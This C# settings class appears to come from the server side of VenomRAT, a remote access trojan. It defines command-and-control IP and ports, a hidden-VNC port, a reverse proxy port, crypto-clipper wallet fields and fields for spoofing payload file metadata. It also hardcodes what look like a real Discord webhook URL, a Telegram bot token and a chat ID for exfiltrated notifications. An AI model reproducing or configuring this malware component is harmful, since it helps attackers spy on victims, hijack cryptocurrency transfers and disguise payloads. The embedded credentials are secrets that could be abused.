using System.CodeDom.Compiler;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;

namespace Server.Properties;

[CompilerGenerated]
[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "16.10.0.0")]
internal sealed class Settings : ApplicationSettingsBase
{
	private static Settings defaultInstance = (Settings)SettingsBase.Synchronized(new Settings());

	public static Settings Default => defaultInstance;

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string Ports
	{
		get
		{
			return (string)this["Ports"];
		}
		set
		{
			this["Ports"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string Filename
	{
		get
		{
			return (string)this["Filename"];
		}
		set
		{
			this["Filename"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("True")]
	public bool Notification
	{
		get
		{
			return (bool)this["Notification"];
		}
		set
		{
			this["Notification"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string Paste_bin
	{
		get
		{
			return (string)this["Paste_bin"];
		}
		set
		{
			this["Paste_bin"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string IP
	{
		get
		{
			return (string)this["IP"];
		}
		set
		{
			this["IP"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string ProductName
	{
		get
		{
			return (string)this["ProductName"];
		}
		set
		{
			this["ProductName"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string txtDescription
	{
		get
		{
			return (string)this["txtDescription"];
		}
		set
		{
			this["txtDescription"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string txtCompany
	{
		get
		{
			return (string)this["txtCompany"];
		}
		set
		{
			this["txtCompany"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string txtCopyright
	{
		get
		{
			return (string)this["txtCopyright"];
		}
		set
		{
			this["txtCopyright"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string txtTrademarks
	{
		get
		{
			return (string)this["txtTrademarks"];
		}
		set
		{
			this["txtTrademarks"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string txtOriginalFilename
	{
		get
		{
			return (string)this["txtOriginalFilename"];
		}
		set
		{
			this["txtOriginalFilename"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("0.0.0.0")]
	public string txtProductVersion
	{
		get
		{
			return (string)this["txtProductVersion"];
		}
		set
		{
			this["txtProductVersion"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("0.0.0.0")]
	public string txtFileVersion
	{
		get
		{
			return (string)this["txtFileVersion"];
		}
		set
		{
			this["txtFileVersion"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string txtBlocked
	{
		get
		{
			return (string)this["txtBlocked"];
		}
		set
		{
			this["txtBlocked"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("Default")]
	public string Group
	{
		get
		{
			return (string)this["Group"];
		}
		set
		{
			this["Group"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("VenomRATMutex_VenomRAT")]
	public string Mutex
	{
		get
		{
			return (string)this["Mutex"];
		}
		set
		{
			this["Mutex"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool DingDing
	{
		get
		{
			return (bool)this["DingDing"];
		}
		set
		{
			this["DingDing"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string WebHook
	{
		get
		{
			return (string)this["WebHook"];
		}
		set
		{
			this["WebHook"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string Secret
	{
		get
		{
			return (string)this["Secret"];
		}
		set
		{
			this["Secret"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("3128")]
	public decimal ReverseProxyPort
	{
		get
		{
			return (decimal)this["ReverseProxyPort"];
		}
		set
		{
			this["ReverseProxyPort"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("--- ClipperBTC ---")]
	public string BtcAddr
	{
		get
		{
			return (string)this["BtcAddr"];
		}
		set
		{
			this["BtcAddr"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("--- ClipperETH ---")]
	public string EthAddr
	{
		get
		{
			return (string)this["EthAddr"];
		}
		set
		{
			this["EthAddr"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("--- ClipperLTC ---")]
	public string LtcAddr
	{
		get
		{
			return (string)this["LtcAddr"];
		}
		set
		{
			this["LtcAddr"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("https://discord.com/api/webhooks/1016614786533969920/fMJOOjA1pZqjV8_s0JC86KN9Fa0FeGPEHaEak8WTADC18s5Xnk3vl2YBdVD37L0qTWnM")]
	public string DiscordUrl
	{
		get
		{
			return (string)this["DiscordUrl"];
		}
		set
		{
			this["DiscordUrl"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("4448")]
	public int HVNCPort
	{
		get
		{
			return (int)this["HVNCPort"];
		}
		set
		{
			this["HVNCPort"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("5819716395:AAEP-yuJ_QA22yswxx2C-lVY5yPkxnaxFMQ")]
	public string TelegramToken
	{
		get
		{
			return (string)this["TelegramToken"];
		}
		set
		{
			this["TelegramToken"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("5291313312")]
	public string TelegramChatId
	{
		get
		{
			return (string)this["TelegramChatId"];
		}
		set
		{
			this["TelegramChatId"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool TelegramEnabled
	{
		get
		{
			return (bool)this["TelegramEnabled"];
		}
		set
		{
			this["TelegramEnabled"] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	public Color ColumColor
	{
		get
		{
			return (Color)this["ColumColor"];
		}
		set
		{
			this["ColumColor"] = value;
		}
	}
}
